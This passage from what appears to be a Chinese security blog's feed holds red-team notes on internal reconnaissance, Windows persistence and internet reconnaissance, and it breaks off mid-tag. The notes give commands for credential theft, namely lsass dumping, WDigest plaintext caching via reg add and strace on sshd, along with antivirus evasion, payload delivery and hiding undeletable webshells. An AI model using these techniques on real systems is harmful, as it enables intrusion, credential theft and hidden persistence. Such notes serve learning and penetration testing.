                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804140643902.png"
                      alt="image-20230804140643902"
                ></p>
<h4 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h4><p>一般整个域内的时间都是由域控进行同步的，所以可以通过时间来判断域控主机的主机名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804141124904.png"
                      alt="image-20230804141124904"
                ></p>
<p>还可以直接net group “Domian controllers” &#x2F;Domain来查询域控名</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804141448495.png"
                      alt="image-20230804141448495"
                ></p>
<p>除此之外域控一般还用于充当DNS服务器，可以利用这个来定位域控</p>
<p>注意：Linux系统可以是域控制器的，但是功能会比较少，且难以管理，所以一般来说域控制器使用Windows系统来实现的，Linux用作服务器</p>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="进程查看"><a href="#进程查看" class="headerlink" title="进程查看"></a>进程查看</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804145323527.png"
                      alt="image-20230804145323527"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804145347970.png"
                      alt="image-20230804145347970"
                ></p>
<h4 id="杀软信息"><a href="#杀软信息" class="headerlink" title="杀软信息"></a>杀软信息</h4><h5 id="规避敏感操作"><a href="#规避敏感操作" class="headerlink" title="规避敏感操作"></a>规避敏感操作</h5><p>如果该系统部署了杀软的话就需要注意避免敏感的操作</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">提权       Dump Lsass内存    远程下载      浏览器抓取密码</span><br><span class="line">克隆账号    创建账户          注册表操作    计划任务</span><br></pre></td></tr></table></figure></div>

<p>这些一系列行为几乎都会留下痕迹，日志等，再加上杀软的实时监测，很容易暴露自己的身份被溯源</p>
<h5 id="免杀对抗"><a href="#免杀对抗" class="headerlink" title="免杀对抗"></a>免杀对抗</h5><p>当获取杀软信息之后就可以做免杀对抗</p>
<p>针对不同的杀软进行针对性的免杀操作：360、火绒、Windows Defender等</p>
<h5 id="载荷投递"><a href="#载荷投递" class="headerlink" title="载荷投递"></a>载荷投递</h5><p>用于对目标主机进行木马的下载</p>
<p>可以通过IPC$共享或者搭建SMB服务器，然后配合计划任务通过UNC路径来传入攻击载荷</p>
<p>系统程序下载：wget、curl、certutil、浏览器</p>
<p>webshell上传：蚁剑、冰蝎、哥斯拉</p>
<p>Windows白名单程序：mshta、msiexec</p>
<p>MSI是Windows中一个重要的服务，有个特性是以高权限来运行，生成.msi的攻击载荷可以达到提权的目的</p>
<p>脚本语言下载：asp、php、jsp这些类型的木马</p>
<p>shellcode：哥斯拉、shellcode加载器</p>
<h4 id="进程路径信息"><a href="#进程路径信息" class="headerlink" title="进程路径信息"></a>进程路径信息</h4><p>查找定位一些程序的位置，比如远控软件、微信、邮箱的安装路径等</p>
<h3 id="DNS是否正常-x2F-TCP出否出网"><a href="#DNS是否正常-x2F-TCP出否出网" class="headerlink" title="DNS是否正常&#x2F;TCP出否出网"></a>DNS是否正常&#x2F;TCP出否出网</h3><h4 id="判断C2上线的方式"><a href="#判断C2上线的方式" class="headerlink" title="判断C2上线的方式"></a>判断C2上线的方式</h4><h5 id="TCP出网，DNS正常"><a href="#TCP出网，DNS正常" class="headerlink" title="TCP出网，DNS正常"></a>TCP出网，DNS正常</h5><p>就可以利用云函数进行上线</p>
<h5 id="TCP不出网"><a href="#TCP不出网" class="headerlink" title="TCP不出网"></a>TCP不出网</h5><p>可以考虑DNS ICMP</p>
<h4 id="判断隧道的使用方式"><a href="#判断隧道的使用方式" class="headerlink" title="判断隧道的使用方式"></a>判断隧道的使用方式</h4><h5 id="TCP出网"><a href="#TCP出网" class="headerlink" title="TCP出网"></a>TCP出网</h5><p>可以利用反向TCP，如frp、nps的反向代理将数据外带</p>
<h5 id="TCP不出网-1"><a href="#TCP不出网-1" class="headerlink" title="TCP不出网"></a>TCP不出网</h5><h6 id="正向HTTP"><a href="#正向HTTP" class="headerlink" title="正向HTTP"></a>正向HTTP</h6><p>Neo-reGeorg</p>
<h6 id="反向ICMP"><a href="#反向ICMP" class="headerlink" title="反向ICMP"></a>反向ICMP</h6><p>frp+icmptunnel</p>
<p>进行反向的icmp隧道</p>
<h4 id="代理服务器"><a href="#代理服务器" class="headerlink" title="代理服务器"></a>代理服务器</h4><p>如果该主机中TCP和ICMP均不出网，但是却配置了 代理服务器，就可以C2&#x2F;隧道配置代理可出网</p>
<h4 id="特定端口出网"><a href="#特定端口出网" class="headerlink" title="特定端口出网"></a>特定端口出网</h4><p>就可以修改C2的监听器和隧道的服务器端口</p>
<h3 id="本地端口开放情况"><a href="#本地端口开放情况" class="headerlink" title="本地端口开放情况"></a>本地端口开放情况</h3><h4 id="端口开放查询"><a href="#端口开放查询" class="headerlink" title="端口开放查询"></a>端口开放查询</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804161227177.png"
                      alt="image-20230804161227177" style="zoom:67%;" 
                >

<p>通过端口开放情况就可以制定下一步的利用方法，比如开启了139、445端口就可以考虑是否可以利用IPC$共享来获取连接，实现攻击载荷的上传，进行进一步的横向</p>
<h4 id="攻击脆弱服务"><a href="#攻击脆弱服务" class="headerlink" title="攻击脆弱服务"></a>攻击脆弱服务</h4><h5 id="MSSQL执行命令"><a href="#MSSQL执行命令" class="headerlink" title="MSSQL执行命令"></a>MSSQL执行命令</h5><p>可以试试能不能绕过杀软进行添加用户以及文件上传的操作</p>
<h5 id="web高权限服务"><a href="#web高权限服务" class="headerlink" title="web高权限服务"></a>web高权限服务</h5><h5 id="远程桌面服务"><a href="#远程桌面服务" class="headerlink" title="远程桌面服务"></a>远程桌面服务</h5><h6 id="查询在线用户"><a href="#查询在线用户" class="headerlink" title="查询在线用户"></a>查询在线用户</h6><p>有在线用户千万不要去挤人家，容易被发现，rdp的流量是十分敏感的，登进去别人就得退出来</p>
<h6 id="查询端口"><a href="#查询端口" class="headerlink" title="查询端口"></a>查询端口</h6><h6 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h6><p>net start可以查看已经开启的服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804144819963.png"
                      alt="image-20230804144819963"
                ></p>
<h6 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804212837031.png"
                      alt="image-20230804212837031"
                ></p>
<h6 id="hash免密登录"><a href="#hash免密登录" class="headerlink" title="hash免密登录"></a>hash免密登录</h6><h4 id="常用服务端口变化"><a href="#常用服务端口变化" class="headerlink" title="常用服务端口变化"></a>常用服务端口变化</h4><p>SSH（22）：22022、2222</p>
<p>RDP（3389）：33888、33899</p>
<p>有些系统出于对安全性的考虑，会将一些常用的服务端口进行端口的改变使得不容易被攻击者发现</p>
<h3 id="密码连接信息"><a href="#密码连接信息" class="headerlink" title="密码连接信息"></a>密码连接信息</h3><p>SSH远程连接的工具：xshell、secureCRT、FinalShell等</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804163223138.png"
                      alt="image-20230804163223138" style="zoom: 67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804163310982.png"
                      alt="image-20230804163310982" style="zoom:67%;" 
                >

<p>数据库工具：Navicat</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804212952758.png"
                      alt="image-20230804212952758" style="zoom: 80%;" 
                >

<p>文件传输工具：winSCP</p>
<p>浏览器：IE、firefox、chrome、360</p>
<p>浏览器中一般会存有系统的密码，可以利用HackBRowserData导出浏览器中的密码、历史记录cookies以及书签等</p>
<p><a class="link"   href="https://github.com/moonD4rk/HackBrowserData" >https://github.com/moonD4rk/HackBrowserData <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>运行可得到results</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804214045889.png"
                      alt="image-20230804214045889"
                ></p>
<p>然后打开就可以查看各个浏览器所保存的信息了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804214203123.png"
                      alt="image-20230804214203123"
                ></p>
<p>可以看到在浏览器下载的记录也可以获取到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804214314354.png"
                      alt="image-20230804214314354"
                ></p>
<p>RDP连接记录</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804160518572.png"
                      alt="image-20230804160518572"
                ></p>
<p>注册表：有些注册表会明文存储密码</p>
<p>配置文件：配置文件中也会可能存在一些明文密码，配置不当造成或者忘记删除了</p>
<p>wifi：WiFi密码获取</p>
<p>SVN：可以获取一些项目的共享资源，如源代码、文档等</p>
<h4 id="系统的账号密码"><a href="#系统的账号密码" class="headerlink" title="系统的账号密码"></a>系统的账号密码</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><h6 id="dump-lsass内存"><a href="#dump-lsass内存" class="headerlink" title="dump lsass内存"></a>dump lsass内存</h6><p>可以利用procdump+mimikatz配合使用，绕过杀软获取主机的密码</p>
<p>先利用procdump获取到lsass.dmp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804150817153.png"
                      alt="image-20230804150817153"
                ></p>
<p>然后利用mimikatz再进行密码的读取，即可获得该主机的密码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804151151188.png"
                      alt="image-20230804151151188" style="zoom:67%;" 
                >

<p>为什么能绕过杀软？</p>
<p>因为pecdump这个软件是由微软开发的一个工具，并不会被杀软识别为恶意的软件进行查杀</p>
<p>主要是将lsass.dmp外带到自己的攻击机上进行mimikatz读取的，所以达到了免杀的目的</p>
<h6 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h6><p>位于C:\Windows&#x2F;system32&#x2F;config&#x2F;</p>
<p>安全账号管理器，作用是对Windows账户安全进行管理，是通过“安全标识”实行的，是每个账户的唯一标识</p>
<h6 id="修改注册表记录明文密码"><a href="#修改注册表记录明文密码" class="headerlink" title="修改注册表记录明文密码"></a>修改注册表记录明文密码</h6><p>在win2012R2及以上系统中，默认是在内存缓存中禁止保存着明文密码的。</p>
<p>但是攻击者可以通过修改注册表的方式抓取明文密码，但是这个更改之后是需要用户重新登录才可以成功抓取的</p>
<p>修改注册表信息</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlset\Control\securityProviders\wDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804151932718.png"
                      alt="image-20230804151932718"
                ></p>
<p>然后重启之后通过mimikatz进行明文密码的读取</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804152218157.png"
                      alt="image-20230804152218157" style="zoom:67%;" 
                >

<h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><h6 id="strace-SSHD进程-x2F-SSH程序"><a href="#strace-SSHD进程-x2F-SSH程序" class="headerlink" title="strace SSHD进程&#x2F;SSH程序"></a>strace SSHD进程&#x2F;SSH程序</h6><p>可以利用Strace监听SSH来源流量来记录密码后门</p>
<p>先需要查找sshd进程的PID</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep sshd #父进程PID</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804152855947.png"
                      alt="image-20230804152855947"
                ></p>
<p>然后开始抓取流量</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">strace -f -p 1244 -o /tmp/.ssh.log -e trace=read,write,connect -s 2048</span><br></pre></td></tr></table></figure></div>

<p>这个状态就是在监听流量了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804153046704.png"
                      alt="image-20230804153046704"
                ></p>
<p>然后任意一个用户登录或者ssh连接就可以记录到密码信息</p>
<p>我们另起一个终端用来模拟用户ssh连接</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804154905471.png"
                      alt="image-20230804154905471"
                ></p>
<p>这边监听的终端就会有数据流入</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804153349494.png"
                      alt="image-20230804153349494"
                ></p>
<p>然后流量信息就会保存在&#x2F;tmp&#x2F;.ssh.log中了，这样就可以在这里面寻找记录的明文密码信息了，由于&#x2F;.tmp&#x2F;.ssh.log中的内容比较多而杂，我这边的密码是123456所以就直接关键字查找了，正常得去翻看文件内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804155104897.png"
                      alt="image-20230804155104897"
                ></p>
<h6 id="CVE-2018-20781"><a href="#CVE-2018-20781" class="headerlink" title="CVE-2018-20781"></a>CVE-2018-20781</h6><h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><p><strong>桌面&#x2F;个人文档&#x2F;配置文件&#x2F;垃圾桶&#x2F;最近打开的文档</strong></p>
<p>这些信息都可以进行查看收集，可能会存有相关的敏感信息，如通讯录&#x2F;组织架构，运维信息，密码信息，网络架构</p>
<p><strong>. bash_history、.ssh&#x2F;known_host文件</strong></p>
<p>.bash_history文件记录了操作历史，可以读取这个文件查看管理员的操作历史以获取有价值的信息</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804170239705.png"
                      alt="image-20230804170239705" style="zoom:67%;" 
                >

<p>.ssh&#x2F;known_host文件是ssh的连接记录</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804170825986.png"
                      alt="image-20230804170825986"  
                >

<p><strong>键盘记录&#x2F;截图</strong></p>
<p>键盘记录脚本植入，当运维人员或者管理员再次输入重要系统的密码的时候就会被记录</p>
<p><strong>网卡流量嗅探</strong></p>
<p>如果是明文传输的话，就会获取到一些敏感信息</p>
<h3 id="本地软件"><a href="#本地软件" class="headerlink" title="本地软件"></a>本地软件</h3><p>微信&#x2F;钉钉&#x2F;企业微信&#x2F;内网通讯工具：可以翻看这些软件是否有有用的信息</p>
<p>邮箱：获取邮箱账号的话除了可以进行翻看邮箱记录还可以结合通讯录收集发送钓鱼文件，实现内部精准钓鱼</p>
<p>云盘：</p>
<p>笔记：一些记事本或者文本文件中，可能由于运维人员图方便会在里面记录系统账号密码等信息</p>
<p>远程运维软件：用于提权&#x2F;后门</p>
<p>VPN：VPN管理地址</p>
<p>EDR：终端安全管理工具服务地址</p>
<p>VPN和EDR可以利用漏洞进行攻击，或者收集相关的网段信息</p>
<h2 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h2><h3 id="网段收集"><a href="#网段收集" class="headerlink" title="网段收集"></a>网段收集</h3><p><strong>路由信息&#x2F;ARP</strong></p>
<p>arp信息，由于我配置了双网卡所以具有两个接口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804171800851.png"
                      alt="image-20230804171800851"
                ></p>
<p><strong>防火墙信息</strong></p>
<p>查看防火墙的出入站规则</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804171438546.png"
                      alt="image-20230804171438546"
                ></p>
<p><strong>traceroute&#x2F;tracert</strong></p>
<p><strong>登录记录（last&#x2F;rdp日志）</strong></p>
<p>Windows的rdp登录日志</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804164838836.png"
                      alt="image-20230804164838836"
                ></p>
<p>Linux</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804164513295.png"
                      alt="image-20230804164513295"
                ></p>
<p><strong>域名解析（host）</strong></p>
<p>这个存在于C:\Windows\System32\drivers\etc\hosts</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230804165130543.png"
                      alt="image-20230804165130543"
                ></p>
<p>网络连接（netstat&#x2F;代理服务器）</p>
<p>.bash_history,.ssh&#x2F;known_host文件，&#x2F;home目录</p>
<h3 id="资产探测"><a href="#资产探测" class="headerlink" title="资产探测"></a>资产探测</h3><p>有点类似于密码爆破和密码喷洒的关系</p>
<h4 id="单个高位端口多IP段探测"><a href="#单个高位端口多IP段探测" class="headerlink" title="单个高位端口多IP段探测"></a>单个高位端口多IP段探测</h4><p>弱口令&#x2F;系统漏洞：22，135，445，1433，3306，3389</p>
<h4 id="多web服务端口单IP段探测"><a href="#多web服务端口单IP段探测" class="headerlink" title="多web服务端口单IP段探测"></a>多web服务端口单IP段探测</h4><p>web漏洞：80，443，7001，8080</p>
<p>k8s组件：2375，6443，10250</p>
<h2 id="云环境信息收集"><a href="#云环境信息收集" class="headerlink" title="云环境信息收集"></a>云环境信息收集</h2><h3 id="判断是否在容器中"><a href="#判断是否在容器中" class="headerlink" title="判断是否在容器中"></a>判断是否在容器中</h3><p>获取Capbilities信息：容器逃逸</p>
<p>寻找集群身份认证凭据：本地环境变量、本地密钥文件</p>
]]></content>
  </entry>
  <entry>
    <title>windows权限维持-图标替换</title>
    <url>/2024/02/29/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9B%BE%E6%A0%87%E6%9B%BF%E6%8D%A2/</url>
    <content><![CDATA[<h1 id="windows权限维持-图标替换"><a href="#windows权限维持-图标替换" class="headerlink" title="windows权限维持-图标替换"></a>windows权限维持-图标替换</h1><h3 id="“真正”隐藏文件"><a href="#“真正”隐藏文件" class="headerlink" title="“真正”隐藏文件"></a>“真正”隐藏文件</h3><p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib +s +a +h +r  c:\test</span><br></pre></td></tr></table></figure></div>

<p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见</p>
<h3 id="系统文件夹图标"><a href="#系统文件夹图标" class="headerlink" title="系统文件夹图标"></a>系统文件夹图标</h3><p>1.建一个文件夹，假设叫 “我的电脑”。<br>2.然后把要存放的文件放进里面。<br>3.给文件夹重新命名为：“我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}”</p>
<p>894761-20180731141238068-799559875.png<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://ms.ms08067.com/img/2022/04/28/2022-04-28_093830_907068.png"
                      alt="null"
                ></p>
<p>4.确定后你会发现文件夹变成我的电脑的图标,且打开它后进入的也是我的电脑。</p>
<p>如何打开这个文件夹：我们先用WinRAR找到这个文件夹，然后重命名文件夹把后缀的“.{20D04FE0-3AEA-1069-A2D8-08002B30309D}”删除。</p>
<p>然后我们再回到文件夹的存放地方，会发现已经变回原来的普通文件夹了</p>
<p>下面是代号：</p>
<p>　　我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}</p>
<p>　　回收站.{645ff040-5081-101b-9f08-00aa002f954e}</p>
<p>　　拔号网络.{992CFFA0-F557-101A-88EC-00DD010CCC48}</p>
<p>　　打印机.{2227a280-3aea-1069-a2de-08002b30309d}</p>
<p>　　控制面板.{21ec2020-3aea-1069-a2dd-08002b30309d}</p>
<p>　　网上邻居.{208D2C60-3AEA-1069-A2D7-08002B30309D}</p>
<h3 id="畸形目录"><a href="#畸形目录" class="headerlink" title="畸形目录"></a>畸形目录</h3><p>只需要在目录名后面加两个点（也可以为多个点）就行了，用户图形界面无法访问</p>
<p>创建目录：md a…\ &#x2F;&#x2F;三个点,实际显示为 a..</p>
<p>复制文件：copy 1.asp D:\phpStudy4IIS\WWW\test\a…\1.asp</p>
<p>URL访问：&#x2F;a..&#x2F;1.asp （两个点）</p>
<p>删除目录： rd &#x2F;s &#x2F;q a…\</p>
<p>用户图形界面访问报错界面：</p>
<p>894761-20170929165146028-158516339.png<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://ms.ms08067.com/img/2022/04/28/2022-04-28_141953_167821.png"
                      alt="null"
                ></p>
<p>利用系统保留文件名创建无法删除的webshell</p>
<p>　　Windows 下不能够以下面这些字样来命名文件&#x2F;文件夹，包括：aux，com1，com2，prn，con和nul等，但是通过cmd下是可以创建此类文件夹的，使用copy命令即可实现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpStudy4IIS\WWW\test&gt;copy 1.asp \\.\D:\phpStudy4IIS\WWW\test\aux.asp         //文件名形式也可以如 nul.xxx.asp已复制         1 个文件。D:\phpStudy4IIS\WWW\test&gt;dir 驱动器 D 中的卷是 新加卷 卷的序列号是 F4C1-D894 D:\phpStudy4IIS\WWW\test 的目录2017-09-29  08:25    &lt;DIR&gt;          .2017-09-29  08:25    &lt;DIR&gt;          ..2017-09-29  07:37                30 1.asp2017-09-29  07:07                40 1.aspx2017-09-29  06:56                38 1.php2017-09-29  06:59                 0 1.txt2017-09-29  07:23                29 2.asp2017-09-29  07:41    &lt;DIR&gt;          a..2017-09-29  07:37                30 aux.asp               6 个文件            167 字节               3 个目录 12,132,085,760 可用字节D:\phpStudy4IIS\WWW\test&gt;del \\.\D:\phpStudy4IIS\WWW\test\aux.asp   //删除文件D:\phpStudy4IIS\WWW\test&gt;type \\.\D:\phpStudy4IIS\WWW\test\aux.asp   //读取文件内容</span><br></pre></td></tr></table></figure></div>

<p>利用系统保留文件名创建无法删除的webshell，这类文件无法在图形界面删除，只能在命令行下删除，然而在IIS中，这种文件又是可以解析成功的。</p>
<p>aux.asp图形界面拒绝访问</p>
<p>小技巧： attrib 1.txt &#x2F;&#x2F;查看文件属性 <em>attrib 1.txt -r -s &#x2F;&#x2F;删除文件属性</em></p>
<p><em>attrib +H +S 1.asp 改变文件属性，隐藏</em></p>
<p>attrib -H -S 1.asp</p>
]]></content>
  </entry>
  <entry>
    <title>互联网信息收集</title>
    <url>/2024/02/29/%E4%BA%92%E8%81%94%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="互联网信息收集"><a href="#互联网信息收集" class="headerlink" title="互联网信息收集"></a>互联网信息收集</h1><p>在红蓝对抗过程中，前期的信息收集是十分重要的，乃至信息收集是贯穿在一整攻防实践过程中的，渗透的本质就是信息收集</p>
<p>可以说技术储备决定了渗透的广度，但信息收集决定了渗透的深度</p>
<h4 id="主要的信息收集点"><a href="#主要的信息收集点" class="headerlink" title="主要的信息收集点"></a>主要的信息收集点</h4><p>IP地址、域名、企业的资产&#x2F;注册信息、结构、敏感信息（邮箱、账号密码等）以及攻击面（系统、框架、中间件）等</p>
<h2 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h2><h3 id="备案域名的查询"><a href="#备案域名的查询" class="headerlink" title="备案域名的查询"></a>备案域名的查询</h3><p>工信部备案查询：<a class="link"   href="https://beian.miit.gov.cn/" >https://beian.miit.gov.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>一般先到这里查询，比较官方，查询结果比较准确</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803212524735.png"
                      alt="image-20230803212524735"
                ></p>
<p>公安部备案查询：<a class="link"   href="http://www.beian.gov.cn/portal/recordQuery" >http://www.beian.gov.cn/portal/recordQuery <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这里也是可以的，结果也是比较准确的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803212630725.png"
                      alt="image-20230803212630725"
                ></p>
<p>天眼查：<a class="link"   href="https://beian.tianyancha.com/" >https://beian.tianyancha.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>备案查询，备选，不够全面，可以看到下面的信息是比较少的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803212716331.png"
                      alt="image-20230803212716331"
                ></p>
<p>爱企查：<a class="link"   href="https://aiqicha.baidu.com/" >https://aiqicha.baidu.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>查询原理是通过企业名称查询域名，并不能直接根据域名来查询</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803213127092.png"
                      alt="image-20230803213127092"
                ></p>
<p>ICP备案查询：<a class="link"   href="http://icp.chinaz.com/" >http://icp.chinaz.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013100456145.png"
                      alt="image-20231013100456145"
                ></p>
<p>SEO综合查询：<a class="link"   href="http://seo.chinaz.com/" >http://seo.chinaz.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013101135336.png"
                      alt="image-20231013101135336"
                ></p>
<h4 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h4><p>whois查询可以获取注册人的关键信息。如电话，邮箱，姓名等，也可以通过这些信息来反查域名</p>
<p>还可以通过一些搜索引擎或者社工的方式去挖掘目标的更多信息</p>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p>站长之家(收费)：<a class="link"   href="http://whois.chinaz.com/" >http://whois.chinaz.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013100636449.png"
                      alt="image-20231013100636449"
                ></p>
<p>Bugscanner：<a class="link"   href="http://whois.bugscaner.com/" >http://whois.bugscaner.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>这个工具需要登录才能使用</p>
<p>腾讯云：<a class="link"   href="https://whois.cloud.tencent.com/" >https://whois.cloud.tencent.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803213719195.png"
                      alt="image-20230803213719195" style="zoom:67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803213759454.png"
                      alt="image-20230803213759454" style="zoom: 67%;" 
                >

<p>国外：<a class="link"   href="https://lookup.icann.org/" >https://lookup.icann.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803214045852.png"
                      alt="image-20230803214045852" style="zoom:67%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230803214131434.png"
                      alt="image-20230803214131434" style="zoom:67%;" 
                >

<p>kali中也具有whois查询功能</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20231013104643841.png"
                      alt="image-20231013104643841"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
